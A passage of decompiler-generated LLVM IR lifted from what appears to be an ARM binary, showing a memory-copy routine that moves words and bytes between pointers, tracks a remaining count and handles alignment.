  %v7_17390 = icmp eq i32 %v1_17388, 20
  store i1 %v7_17390, i1* %cpsr_z.global-to-local, align 1
  %v2_17394 = xor i1 %v6_17390, %v5_17390
  br i1 %v2_17394, label %dec_label_pc_173c8, label %dec_label_pc_17398

dec_label_pc_17398:                               ; preds = %dec_label_pc_17390
  %v0_17398 = load i32, i32* @r4, align 4
  store i32 %v0_17398, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1739c

dec_label_pc_1739c:                               ; preds = %dec_label_pc_1739c.dec_label_pc_1739c_crit_edge, %dec_label_pc_17398
  %v0_173a0 = phi i32 [ %v12_173a8, %dec_label_pc_1739c.dec_label_pc_1739c_crit_edge ], [ %v0_173a094, %dec_label_pc_17398 ]
  %v0_1739c = phi i32 [ %v0_1739c.pre, %dec_label_pc_1739c.dec_label_pc_1739c_crit_edge ], [ %v0_1739c93, %dec_label_pc_17398 ]
  %v1_1739c = inttoptr i32 %v0_1739c to i32*
  %v2_1739c = load i32, i32* %v1_1739c, align 4
  %v3_1739c = add i32 %v0_1739c, 4
  %v4_1739c = inttoptr i32 %v3_1739c to i32*
  %v5_1739c = load i32, i32* %v4_1739c, align 4
  store i32 %v5_1739c, i32* %r4.global-to-local, align 4
  %v6_1739c = add i32 %v0_1739c, 8
  %v7_1739c = inttoptr i32 %v6_1739c to i32*
  %v8_1739c = load i32, i32* %v7_1739c, align 4
  store i32 %v8_1739c, i32* %ip.global-to-local, align 4
  %v9_1739c = add i32 %v0_1739c, 12
  %v10_1739c = inttoptr i32 %v9_1739c to i32*
  %v11_1739c = load i32, i32* %v10_1739c, align 4
  store i32 %v11_1739c, i32* %lr.global-to-local, align 4
  %v12_1739c = add i32 %v0_1739c, 16
  store i32 %v12_1739c, i32* %r1.global-to-local, align 4
  %v1_173a0 = inttoptr i32 %v0_173a0 to i32*
  store i32 %v2_1739c, i32* %v1_173a0, align 4
  %v3_173a0 = add i32 %v0_173a0, 4
  %v4_173a0 = inttoptr i32 %v3_173a0 to i32*
  %v5_173a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_173a0, i32* %v4_173a0, align 4
  %v6_173a0 = add i32 %v0_173a0, 8
  %v7_173a0 = inttoptr i32 %v6_173a0 to i32*
  %v8_173a0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_173a0, i32* %v7_173a0, align 4
  %v9_173a0 = add i32 %v0_173a0, 12
  %v10_173a0 = inttoptr i32 %v9_173a0 to i32*
  %v11_173a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_173a0, i32* %v10_173a0, align 4
  %v12_173a0 = add i32 %v0_173a0, 16
  store i32 %v12_173a0, i32* %r0.global-to-local, align 4
  %v0_173a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_173a4 = inttoptr i32 %v0_173a4 to i32*
  %v2_173a4 = load i32, i32* %v1_173a4, align 4
  store i32 %v2_173a4, i32* @r3, align 4
  %v3_173a4 = add i32 %v0_173a4, 4
  %v4_173a4 = inttoptr i32 %v3_173a4 to i32*
  %v5_173a4 = load i32, i32* %v4_173a4, align 4
  store i32 %v5_173a4, i32* %r4.global-to-local, align 4
  %v6_173a4 = add i32 %v0_173a4, 8
  %v7_173a4 = inttoptr i32 %v6_173a4 to i32*
  %v8_173a4 = load i32, i32* %v7_173a4, align 4
  store i32 %v8_173a4, i32* @ip, align 4
  %v9_173a4 = add i32 %v0_173a4, 12
  %v10_173a4 = inttoptr i32 %v9_173a4 to i32*
  %v11_173a4 = load i32, i32* %v10_173a4, align 4
  store i32 %v11_173a4, i32* %lr.global-to-local, align 4
  %v12_173a4 = add i32 %v0_173a4, 16
  store i32 %v12_173a4, i32* @r1, align 4
  %v1_173a8 = inttoptr i32 %v12_173a0 to i32*
  store i32 %v2_173a4, i32* %v1_173a8, align 4
  %v3_173a8 = add i32 %v0_173a0, 20
  %v4_173a8 = inttoptr i32 %v3_173a8 to i32*
  %v5_173a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_173a8, i32* %v4_173a8, align 4
  %v6_173a8 = add i32 %v0_173a0, 24
  %v7_173a8 = inttoptr i32 %v6_173a8 to i32*
  %v8_173a8 = load i32, i32* @ip, align 4
  store i32 %v8_173a8, i32* %v7_173a8, align 4
  %v9_173a8 = add i32 %v0_173a0, 28
  %v10_173a8 = inttoptr i32 %v9_173a8 to i32*
  %v11_173a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_173a8, i32* %v10_173a8, align 4
  %v12_173a8 = add i32 %v0_173a0, 32
  store i32 %v12_173a8, i32* @r0, align 4
  %v0_173ac = load i32, i32* %r2.global-to-local, align 4
  %v1_173ac = add i32 %v0_173ac, -32
  store i32 %v1_173ac, i32* %r2.global-to-local, align 4
  %v3_173ac = sub i32 31, %v0_173ac
  %v4_173ac = and i32 %v3_173ac, %v0_173ac
  %v5_173ac = icmp slt i32 %v4_173ac, 0
  %v6_173ac = icmp slt i32 %v1_173ac, 0
  %v2_173b0 = xor i1 %v6_173ac, %v5_173ac
  br i1 %v2_173b0, label %dec_label_pc_173b4, label %dec_label_pc_1739c.dec_label_pc_1739c_crit_edge

dec_label_pc_1739c.dec_label_pc_1739c_crit_edge:  ; preds = %dec_label_pc_1739c
  %v0_1739c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1739c

dec_label_pc_173b4:                               ; preds = %dec_label_pc_1739c
  %v1_173b4 = add i32 %v0_173ac, -16
  %v3_173b4 = add i32 %v0_173ac, 2147483616
  %v4_173b4 = and i32 %v1_173b4, %v3_173b4
  %v5_173b4 = icmp slt i32 %v4_173b4, 0
  store i1 %v5_173b4, i1* %cpsr_v.global-to-local, align 1
  %v6_173b4 = icmp slt i32 %v1_173b4, 0
  store i1 %v6_173b4, i1* %cpsr_n.global-to-local, align 1
  %v7_173b4 = icmp eq i32 %v1_173b4, 0
  store i1 %v7_173b4, i1* %cpsr_z.global-to-local, align 1
  %v2_173b8 = xor i1 %v6_173b4, %v5_173b4
  br i1 %v2_173b8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_173b4
  %v3_173b8 = load i32, i32* @r1, align 4
  %v4_173b8 = inttoptr i32 %v3_173b8 to i32*
  %v5_173b8 = load i32, i32* %v4_173b8, align 4
  store i32 %v5_173b8, i32* @r3, align 4
  %v6_173b8 = add i32 %v3_173b8, 4
  %v7_173b8 = inttoptr i32 %v6_173b8 to i32*
  %v8_173b8 = load i32, i32* %v7_173b8, align 4
  store i32 %v8_173b8, i32* %r4.global-to-local, align 4
  %v9_173b8 = add i32 %v3_173b8, 8
  %v10_173b8 = inttoptr i32 %v9_173b8 to i32*
  %v11_173b8 = load i32, i32* %v10_173b8, align 4
  store i32 %v11_173b8, i32* @ip, align 4
  %v12_173b8 = add i32 %v3_173b8, 12
  %v13_173b8 = inttoptr i32 %v12_173b8 to i32*
  %v14_173b8 = load i32, i32* %v13_173b8, align 4
  store i32 %v14_173b8, i32* %lr.global-to-local, align 4
  %v15_173b8 = add i32 %v3_173b8, 16
  store i32 %v15_173b8, i32* @r1, align 4
  %v4_173bc = inttoptr i32 %v12_173a8 to i32*
  store i32 %v5_173b8, i32* %v4_173bc, align 4
  %v6_173bc = add i32 %v0_173a0, 36
  %v7_173bc = inttoptr i32 %v6_173bc to i32*
  %v8_173bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_173bc, i32* %v7_173bc, align 4
  %v9_173bc = add i32 %v0_173a0, 40
  %v10_173bc = inttoptr i32 %v9_173bc to i32*
  %v11_173bc = load i32, i32* @ip, align 4
  store i32 %v11_173bc, i32* %v10_173bc, align 4
  %v12_173bc = add i32 %v0_173a0, 44
  %v13_173bc = inttoptr i32 %v12_173bc to i32*
  %v14_173bc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_173bc, i32* %v13_173bc, align 4
  %v15_173bc = add i32 %v0_173a0, 48
  store i32 %v15_173bc, i32* @r0, align 4
  %v3_173c0 = load i32, i32* %r2.global-to-local, align 4
  %v4_173c0 = add i32 %v3_173c0, -16
  store i32 %v4_173c0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_173b4, %bb136
  %v3_173d0102111 = phi i32 [ %v15_173bc, %bb136 ], [ %v12_173a8, %dec_label_pc_173b4 ]
  %v0_173c8.pre = phi i32 [ %v4_173c0, %bb136 ], [ %v1_173ac, %dec_label_pc_173b4 ]
  %v2_173c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_173c4, i32* @r4, align 4
  br label %dec_label_pc_173c8

dec_label_pc_173c8:                               ; preds = %dec_label_pc_17390, %bb137
  %v3_173d0101 = phi i32 [ %v0_173a094, %dec_label_pc_17390 ], [ %v3_173d0102111, %bb137 ]
  %v0_173c8 = phi i32 [ %v1_17390, %dec_label_pc_17390 ], [ %v0_173c8.pre, %bb137 ]
  %v1_173c8 = add i32 %v0_173c8, 20
  store i32 %v1_173c8, i32* %r2.global-to-local, align 4
  %v3_173c8 = sub i32 0, %v0_173c8
  %v4_173c8 = and i32 %v1_173c8, %v3_173c8
  %v5_173c8 = icmp slt i32 %v4_173c8, 0
  store i1 %v5_173c8, i1* %cpsr_v.global-to-local, align 1
  %v6_173c8 = icmp slt i32 %v1_173c8, 0
  store i1 %v6_173c8, i1* %cpsr_n.global-to-local, align 1
  %v7_173c8 = icmp eq i32 %v1_173c8, 0
  store i1 %v7_173c8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_173cc

dec_label_pc_173cc:                               ; preds = %.thread115, %dec_label_pc_173c8
  %v0_173dc.pre157 = phi i32 [ %v0_173dc.pre, %.thread115 ], [ %v1_173c8, %dec_label_pc_173c8 ]
  %v3_173d0 = phi i32 [ %v3_173d099116, %.thread115 ], [ %v3_173d0101, %dec_label_pc_173c8 ]
  %v1_173d4 = phi i1 [ %v1_173d8, %.thread115 ], [ %v5_173c8, %dec_label_pc_173c8 ]
  %v0_173d4 = phi i1 [ %v0_173d8, %.thread115 ], [ %v6_173c8, %dec_label_pc_173c8 ]
  %v2_173cc = xor i1 %v1_173d4, %v0_173d4
  br i1 %v2_173cc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_173cc
  %v3_173cc = load i32, i32* @r1, align 4
  %v4_173cc = inttoptr i32 %v3_173cc to i32*
  %v5_173cc = load i32, i32* %v4_173cc, align 4
  store i32 %v5_173cc, i32* @r3, align 4
  %v6_173cc = add i32 %v3_173cc, 4
  %v7_173cc = inttoptr i32 %v6_173cc to i32*
  %v8_173cc = load i32, i32* %v7_173cc, align 4
  store i32 %v8_173cc, i32* @ip, align 4
  %v9_173cc = add i32 %v3_173cc, 8
  %v10_173cc = inttoptr i32 %v9_173cc to i32*
  %v11_173cc = load i32, i32* %v10_173cc, align 4
  store i32 %v11_173cc, i32* %lr.global-to-local, align 4
  %v12_173cc = add i32 %v3_173cc, 12
  store i32 %v12_173cc, i32* @r1, align 4
  %v4_173d0 = inttoptr i32 %v3_173d0 to i32*
  store i32 %v5_173cc, i32* %v4_173d0, align 4
  %v6_173d0 = add i32 %v3_173d0, 4
  %v7_173d0 = inttoptr i32 %v6_173d0 to i32*
  %v8_173d0 = load i32, i32* @ip, align 4
  store i32 %v8_173d0, i32* %v7_173d0, align 4
  %v9_173d0 = add i32 %v3_173d0, 8
  %v10_173d0 = inttoptr i32 %v9_173d0 to i32*
  %v11_173d0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_173d0, i32* %v10_173d0, align 4
  %v12_173d0 = add i32 %v3_173d0, 12
  store i32 %v12_173d0, i32* @r0, align 4
  %v3_173d4 = load i32, i32* %r2.global-to-local, align 4
  %v4_173d4 = add i32 %v3_173d4, -12
  store i32 %v4_173d4, i32* %r2.global-to-local, align 4
  %v6_173d4 = sub i32 11, %v3_173d4
  %v7_173d4 = and i32 %v6_173d4, %v3_173d4
  %v8_173d4 = icmp slt i32 %v7_173d4, 0
  store i1 %v8_173d4, i1* %cpsr_v.global-to-local, align 1
  %v9_173d4 = icmp slt i32 %v4_173d4, 0
  store i1 %v9_173d4, i1* %cpsr_n.global-to-local, align 1
  %v10_173d4 = icmp eq i32 %v3_173d4, 12
  store i1 %v10_173d4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_173cc, %bb138
  %v0_173dc.pre = phi i32 [ %v4_173d4, %bb138 ], [ %v0_173dc.pre157, %dec_label_pc_173cc ]
  %v3_173d099116 = phi i32 [ %v12_173d0, %bb138 ], [ %v3_173d0, %dec_label_pc_173cc ]
  %v1_173d8 = phi i1 [ %v8_173d4, %bb138 ], [ %v1_173d4, %dec_label_pc_173cc ]
  %v0_173d8 = phi i1 [ %v9_173d4, %bb138 ], [ %v0_173d4, %dec_label_pc_173cc ]
  %v2_173d8 = xor i1 %v1_173d8, %v0_173d8
  br i1 %v2_173d8, label %dec_label_pc_173dc, label %dec_label_pc_173cc

dec_label_pc_173dc:                               ; preds = %.thread115, %dec_label_pc_17388
  %v4_173ec = phi i32 [ %v0_173a094, %dec_label_pc_17388 ], [ %v3_173d099116, %.thread115 ]
  %v0_173dc = phi i32 [ %v1_17388, %dec_label_pc_17388 ], [ %v0_173dc.pre, %.thread115 ]
  %v1_173dc = add i32 %v0_173dc, 8
  store i32 %v1_173dc, i32* %r2.global-to-local, align 4
  %v3_173dc = sub i32 0, %v0_173dc
  %v4_173dc = and i32 %v1_173dc, %v3_173dc
  %v5_173dc = icmp slt i32 %v4_173dc, 0
  store i1 %v5_173dc, i1* %cpsr_v.global-to-local, align 1
  %v6_173dc = icmp slt i32 %v1_173dc, 0
  store i1 %v6_173dc, i1* %cpsr_n.global-to-local, align 1
  %v7_173dc = icmp eq i32 %v1_173dc, 0
  store i1 %v7_173dc, i1* %cpsr_z.global-to-local, align 1
  %v2_173e0 = xor i1 %v6_173dc, %v5_173dc
  br i1 %v2_173e0, label %bb140, label %dec_label_pc_173e4

dec_label_pc_173e4:                               ; preds = %dec_label_pc_173dc
  %v1_173e4 = add i32 %v0_173dc, 4
  store i32 %v1_173e4, i32* %r2.global-to-local, align 4
  %v3_173e4 = sub i32 -5, %v0_173dc
  %v4_173e4 = and i32 %v3_173e4, %v1_173dc
  %v5_173e4 = icmp slt i32 %v4_173e4, 0
  store i1 %v5_173e4, i1* %cpsr_v.global-to-local, align 1
  %v6_173e4 = icmp slt i32 %v1_173e4, 0
  store i1 %v6_173e4, i1* %cpsr_n.global-to-local, align 1
  %v7_173e4 = icmp eq i32 %v1_173dc, 4
  store i1 %v7_173e4, i1* %cpsr_z.global-to-local, align 1
  %v2_173e8 = xor i1 %v6_173e4, %v5_173e4
  %v3_173e8 = load i32, i32* @r1, align 4
  %v4_173e8 = inttoptr i32 %v3_173e8 to i32*
  %v5_173e8 = load i32, i32* %v4_173e8, align 4
  store i32 %v5_173e8, i32* @r3, align 4
  %v7_173e8 = add i32 %v3_173e8, 4
  br i1 %v2_173e8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_173e4
  store i32 %v7_173e8, i32* @r1, align 4
  %v5_173ec = inttoptr i32 %v4_173ec to i32*
  store i32 %v5_173e8, i32* %v5_173ec, align 4
  %v6_173ec = load i32, i32* @r0, align 4
  %v7_173ec = add i32 %v6_173ec, 4
  store i32 %v7_173ec, i32* @r0, align 4
  %v0_173fc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_173e4
  %v7_173f0 = inttoptr i32 %v7_173e8 to i32*
  %v8_173f0 = load i32, i32* %v7_173f0, align 4
  store i32 %v8_173f0, i32* @ip, align 4
  %v9_173f0 = add i32 %v3_173e8, 8
  store i32 %v9_173f0, i32* @r1, align 4
  %v4_173f4 = inttoptr i32 %v4_173ec to i32*
  store i32 %v5_173e8, i32* %v4_173f4, align 4
  %v6_173f4 = add i32 %v4_173ec, 4
  %v7_173f4 = inttoptr i32 %v6_173f4 to i32*
  %v8_173f4 = load i32, i32* @ip, align 4
  store i32 %v8_173f4, i32* %v7_173f4, align 4
  %v9_173f4 = add i32 %v4_173ec, 8
  store i32 %v9_173f4, i32* @r0, align 4
  %v3_173f8 = load i32, i32* %r2.global-to-local, align 4
  %v4_173f8 = add i32 %v3_173f8, -4
  store i32 %v4_173f8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_173dc, %bb, %dec_label_pc_175ac, %dec_label_pc_17540, %dec_label_pc_174d4, %bb139
  %v0_173fc = phi i32 [ %v0_173fc.pre, %.thread122 ], [ %v2_1744c, %.thread128 ], [ %v1_173dc, %dec_label_pc_173dc ], [ %v2_17370, %bb ], [ %v0_173fc61, %dec_label_pc_175ac ], [ %v0_173fc60, %dec_label_pc_17540 ], [ %v0_173fc59, %dec_label_pc_174d4 ], [ %v4_173f8, %bb139 ]
  %v1_173fc = add i32 %v0_173fc, 4
  store i32 %v1_173fc, i32* %r2.global-to-local, align 4
  %v3_173fc = sub i32 0, %v0_173fc
  %v4_173fc = and i32 %v1_173fc, %v3_173fc
  %v5_173fc = icmp slt i32 %v4_173fc, 0
  store i1 %v5_173fc, i1* %cpsr_v.global-to-local, align 1
  %v6_173fc = icmp slt i32 %v1_173fc, 0
  store i1 %v6_173fc, i1* %cpsr_n.global-to-local, align 1
  %v7_173fc = icmp eq i32 %v1_173fc, 0
  store i1 %v7_173fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_173fc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_17404.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_17400 = load i8*, i8** %stack_var_-8, align 4
  %v4_17400 = ptrtoint i8* %v3_17400 to i32
  store i32 %v4_17400, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_17404 = phi i32 [ %v0_17404.pre, %bb140.bb142_crit_edge ], [ %v8_1736c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_173fc, i32 %v0_17404)
  %v0_17408 = load i32, i32* %r2.global-to-local, align 4
  %v1_17408 = add i32 %v0_17408, -2
  %v3_17408 = sub i32 1, %v0_17408
  %v4_17408 = and i32 %v3_17408, %v0_17408
  %v5_17408 = icmp slt i32 %v4_17408, 0
  store i1 %v5_17408, i1* %cpsr_v.global-to-local, align 1
  %v6_17408 = icmp slt i32 %v1_17408, 0
  store i1 %v6_17408, i1* %cpsr_n.global-to-local, align 1
  %v7_17408 = icmp eq i32 %v0_17408, 2
  store i1 %v7_17408, i1* %cpsr_z.global-to-local, align 1
  %v0_1740c = load i32, i32* @r1, align 4
  %v1_1740c = inttoptr i32 %v0_1740c to i8*
  %v2_1740c = load i8, i8* %v1_1740c, align 1
  %v5_1740c = add i32 %v0_1740c, 1
  store i32 %v5_1740c, i32* %r1.global-to-local, align 4
  %v2_17410 = load i32, i32* @r0, align 4
  %v3_17410 = inttoptr i32 %v2_17410 to i8*
  store i8 %v2_1740c, i8* %v3_17410, align 1
  %v4_17410 = load i32, i32* @r0, align 4
  %v5_17410 = add i32 %v4_17410, 1
  store i32 %v5_17410, i32* %r0.global-to-local, align 4
  %v0_17414 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17414 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17414 = xor i1 %v0_17414, %v1_17414
  br i1 %v2_17414, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_17414 = load i32, i32* %r1.global-to-local, align 4
  %v4_17414 = inttoptr i32 %v3_17414 to i8*
  %v5_17414 = load i8, i8* %v4_17414, align 1
  %v8_17414 = add i32 %v3_17414, 1
  store i32 %v8_17414, i32* %r1.global-to-local, align 4
  %v6_17418 = inttoptr i32 %v5_17410 to i8*
  store i8 %v5_17414, i8* %v6_17418, align 1
  %v7_17418 = load i32, i32* %r0.global-to-local, align 4
  %v8_17418 = add i32 %v7_17418, 1
  store i32 %v8_17418, i32* %r0.global-to-local, align 4
  %v1_1741c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1741c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_17420 = phi i32 [ %v8_17418, %bb143 ], [ %v5_17410, %bb142 ]
  %v2_17420 = phi i1 [ %v2_1741c.pre, %bb143 ], [ %v1_17414, %bb142 ]
  %v1_17420 = phi i1 [ %v1_1741c.pre, %bb143 ], [ %v0_17414, %bb142 ]
  %v0_1741c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1741c = xor i1 %v2_17420, %v1_17420
  %v4_1741c = or i1 %v0_1741c, %v3_1741c
  br i1 %v4_1741c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1741c = load i32, i32* %r1.global-to-local, align 4
  %v6_1741c = inttoptr i32 %v5_1741c to i8*
  %v7_1741c = load i8, i8* %v6_1741c, align 1
  %v10_1741c = add i32 %v5_1741c, 1
  store i32 %v10_1741c, i32* %r1.global-to-local, align 4
  %v8_17420 = inttoptr i32 %v7_17420 to i8*
  store i8 %v7_1741c, i8* %v8_17420, align 1
  %v9_17420 = load i32, i32* %r0.global-to-local, align 4
  %v10_17420 = add i32 %v9_17420, 1
  store i32 %v10_17420, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_17424 = load i8*, i8** %stack_var_-8, align 4
  %v3_17424 = ptrtoint i8* %v2_17424 to i32
  store i32 %v3_17424, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1736c)
  %v0_1742c.pre = load i32, i32* @ip, align 4
  %v0_17434.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_17438.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1742c

dec_label_pc_1742c:                               ; preds = %dec_label_pc_17378, %.thread126
  %v2_17438 = phi i32 [ %v1_17360, %dec_label_pc_17378 ], [ %v2_17438.pre, %.thread126 ]
  %v0_17434 = phi i32 [ %v0_17360, %dec_label_pc_17378 ], [ %v0_17434.pre, %.thread126 ]
  %v0_1742c = phi i32 [ %v1_17378, %dec_label_pc_17378 ], [ %v0_1742c.pre, %.thread126 ]
  %v1_1742c = sub i32 4, %v0_1742c
  store i32 %v1_1742c, i32* @ip, align 4
  %v1_17430 = add i32 %v1_1742c, -2
  %v3_17430 = sub i32 1, %v1_1742c
  %v4_17430 = and i32 %v3_17430, %v1_1742c
  %v5_17430 = icmp slt i32 %v4_17430, 0
  store i1 %v5_17430, i1* %cpsr_v.global-to-local, align 1
  %v6_17430 = icmp slt i32 %v1_17430, 0
  store i1 %v6_17430, i1* %cpsr_n.global-to-local, align 1
  %v7_17430 = icmp eq i32 %v1_1742c, 2
  store i1 %v7_17430, i1* %cpsr_z.global-to-local, align 1
  %v1_17434 = inttoptr i32 %v0_17434 to i8*
  %v2_17434 = load i8, i8* %v1_17434, align 1
  %v3_17434 = zext i8 %v2_17434 to i32
  store i32 %v3_17434, i32* @r3, align 4
  %v5_17434 = add i32 %v0_17434, 1
  store i32 %v5_17434, i32* @r1, align 4
  %v3_17438 = inttoptr i32 %v2_17438 to i8*
  store i8 %v2_17434, i8* %v3_17438, align 1
  %v4_17438 = load i32, i32* @r0, align 4
  %v5_17438 = add i32 %v4_17438, 1
  store i32 %v5_17438, i32* @r0, align 4
  %v0_1743c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1743c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1743c = xor i1 %v0_1743c, %v1_1743c
  br i1 %v2_1743c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1742c
  %v3_1743c = load i32, i32* @r1, align 4
  %v4_1743c = inttoptr i32 %v3_1743c to i8*
  %v5_1743c = load i8, i8* %v4_1743c, align 1
  %v6_1743c = zext i8 %v5_1743c to i32
  store i32 %v6_1743c, i32* @r3, align 4
  %v8_1743c = add i32 %v3_1743c, 1
  store i32 %v8_1743c, i32* @r1, align 4
  %v6_17440 = inttoptr i32 %v5_17438 to i8*
  store i8 %v5_1743c, i8* %v6_17440, align 1
  %v7_17440 = load i32, i32* @r0, align 4
  %v8_17440 = add i32 %v7_17440, 1
  store i32 %v8_17440, i32* @r0, align 4
  %v1_17444.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17444.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1742c, %bb145
  %v7_17448 = phi i32 [ %v8_17440, %bb145 ], [ %v5_17438, %dec_label_pc_1742c ]
  %v2_17448 = phi i1 [ %v2_17444.pre, %bb145 ], [ %v1_1743c, %dec_label_pc_1742c ]
  %v1_17448 = phi i1 [ %v1_17444.pre, %bb145 ], [ %v0_1743c, %dec_label_pc_1742c ]
  %v0_17444 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17444 = xor i1 %v2_17448, %v1_17448
  %v4_17444 = or i1 %v0_17444, %v3_17444
  br i1 %v4_17444, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_17444 = load i32, i32* @r1, align 4
  %v6_17444 = inttoptr i32 %v5_17444 to i8*
  %v7_17444 = load i8, i8* %v6_17444, align 1
  %v8_17444 = zext i8 %v7_17444 to i32
  store i32 %v8_17444, i32* @r3, align 4
  %v10_17444 = add i32 %v5_17444, 1
  store i32 %v10_17444, i32* @r1, align 4
  %v8_17448 = inttoptr i32 %v7_17448 to i8*
  store i8 %v7_17444, i8* %v8_17448, align 1
  %v9_17448 = load i32, i32* @r0, align 4
  %v10_17448 = add i32 %v9_17448, 1
  store i32 %v10_17448, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1757c77 = phi i32 [ %v10_17448, %bb146 ], [ %v7_17448, %.thread127 ]
  %v0_1744c = load i32, i32* %r2.global-to-local, align 4
  %v1_1744c = load i32, i32* @ip, align 4
  %v2_1744c = sub i32 %v0_1744c, %v1_1744c
  store i32 %v2_1744c, i32* %r2.global-to-local, align 4
  %v4_1744c = xor i32 %v1_1744c, %v0_1744c
  %v5_1744c = xor i32 %v2_1744c, %v0_1744c
  %v6_1744c = and i32 %v5_1744c, %v4_1744c
  %v7_1744c = icmp slt i32 %v6_1744c, 0
  store i1 %v7_1744c, i1* %cpsr_v.global-to-local, align 1
  %v8_1744c = icmp slt i32 %v2_1744c, 0
  store i1 %v8_1744c, i1* %cpsr_n.global-to-local, align 1
  %v9_1744c = icmp eq i32 %v0_1744c, %v1_1744c
  store i1 %v9_1744c, i1* %cpsr_z.global-to-local, align 1
  %v2_17450 = xor i1 %v8_1744c, %v7_1744c
  br i1 %v2_17450, label %bb140, label %dec_label_pc_17454

dec_label_pc_17454:                               ; preds = %.thread128
  %v0_17454 = load i32, i32* @r1, align 4
  %v1_17454 = urem i32 %v0_17454, 4
  store i32 %v1_17454, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17454 = icmp eq i32 %v1_17454, 0
  store i1 %v2_17454, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_17454 to i2
  br i1 %v2_17454, label %dec_label_pc_17388, label %dec_label_pc_1745c

dec_label_pc_1745c:                               ; preds = %dec_label_pc_17380, %dec_label_pc_17454
  %v0_1757c76 = phi i32 [ %v1_17360, %dec_label_pc_17380 ], [ %v0_1757c77, %dec_label_pc_17454 ]
  %v0_174e4 = phi i32 [ %v2_17370, %dec_label_pc_17380 ], [ %v2_1744c, %dec_label_pc_17454 ]
  %v0_17464.off0 = phi i2 [ %extract.t, %dec_label_pc_17380 ], [ %extract.t131, %dec_label_pc_17454 ]
  %v0_1745c = phi i32 [ %v0_17360, %dec_label_pc_17380 ], [ %v0_17454, %dec_label_pc_17454 ]
  %v1_1745c = and i32 %v0_1745c, -4
  store i32 %v1_1745c, i32* %r1.global-to-local, align 4
  %v1_17460 = inttoptr i32 %v1_1745c to i32*
  %v2_17460 = load i32, i32* %v1_17460, align 4
  store i32 %v2_17460, i32* %lr.global-to-local, align 4
  %v4_17460 = add i32 %v1_1745c, 4
  store i32 %v4_17460, i32* %r1.global-to-local, align 4
  %v1_174dc = add i32 %v0_174e4, -12
  %v3_174dc = sub i32 11, %v0_174e4
  %v4_174dc = and i32 %v3_174dc, %v0_174e4
  %v5_174dc = icmp slt i32 %v4_174dc, 0
  store i1 %v5_174dc, i1* %cpsr_v.global-to-local, align 1
  %v6_174dc = icmp slt i32 %v1_174dc, 0
  store i1 %v6_174dc, i1* %cpsr_n.global-to-local, align 1
  %v7_174dc = icmp eq i32 %v0_174e4, 12
  store i1 %v7_174dc, i1* %cpsr_z.global-to-local, align 1
  %v2_174e0 = xor i1 %v6_174dc, %v5_174dc
  switch i2 %v0_17464.off0, label %dec_label_pc_17470 [
    i2 -1, label %dec_label_pc_17548
    i2 -2, label %dec_label_pc_174dc
  ]

dec_label_pc_17470:                               ; preds = %dec_label_pc_1745c
  br i1 %v2_174e0, label %dec_label_pc_174bc, label %dec_label_pc_17478

dec_label_pc_17478:                               ; preds = %dec_label_pc_17470
  store i32 %v1_174dc, i32* %r2.global-to-local, align 4
  %v3_1747c = load i32, i32* @r4, align 4
  store i32 %v3_1747c, i32* %stack_var_-16, align 4
  %v6_1747c = load i32, i32* @r5, align 4
  store i32 %v6_1747c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17480

dec_label_pc_17480:                               ; preds = %dec_label_pc_17480.dec_label_pc_17480_crit_edge, %dec_label_pc_17478
